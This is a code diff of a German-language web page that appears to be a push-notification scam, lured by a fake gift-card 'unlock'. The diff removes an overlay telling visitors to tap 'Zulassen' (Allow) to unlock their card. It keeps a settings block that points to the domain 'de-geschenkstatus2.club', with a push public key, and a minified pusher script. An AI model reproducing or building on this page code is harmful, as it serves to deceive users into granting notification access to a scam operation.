@@ -160,42 +160,17 @@
         </br>
         </br>
         </br>
-        </br>
-        </br>
         <center><img src="card.png" /></center>
 
     </div>
 
-    <div class="blocker-overlay">
-        <a href="#">Blockieren</a>
-        <small>Blockieren Sie Benachrichtigungen, um dieses Fenster zu schließen</small>
-    </div>
-
-    <div class="block-arrow">
-        <img src="arrow.png" alt="">
-        <p>
-            Bitte tippen Sie auf die Schaltfläche „Zulassen“, um Ihre Karte zu entsperren
-        </p>
-    </div>
-    <script src="moment.js"></script>
-    <script src="moment-timezone.js"></script>
-
-    <script>
-        var pstDate = moment(new Date()).tz('America/Los_Angeles').format('DDMMYYYY');
-        var currentUrl = document.location.href;
-
-        if (currentUrl.indexOf('&date=') < 0 && currentUrl.indexOf('?') > 0) {
-            var urlDate = currentUrl + '&date=' + pstDate;
-            history.replaceState({}, '', urlDate);
-        }
-    </script>
+    <script src="moment.min.js"></script>
 
     <script>
         settingsProvider = {
             domainName: "520:-bfd9pONVmb8hP87TzYO8xVlT78",
             domainURL: "de-geschenkstatus2.club",
             publicKey: "BJWjSY/hjMmTDlegmhTvH6PYsTbxkM+vPbuyHIQApVUpUZfV74pdZWYJ1qWOrMP0u1p9PScxCypZg0R+qp2ScsU=",
-            requestDelay: 3000
         };
 
 
@@ -225,7 +200,7 @@
             }
         };
     </script>
-    <script src="pusher-new.js"></script>
+    <script src="pusher-new.min.js"></script>
 </body>
 
 </html>
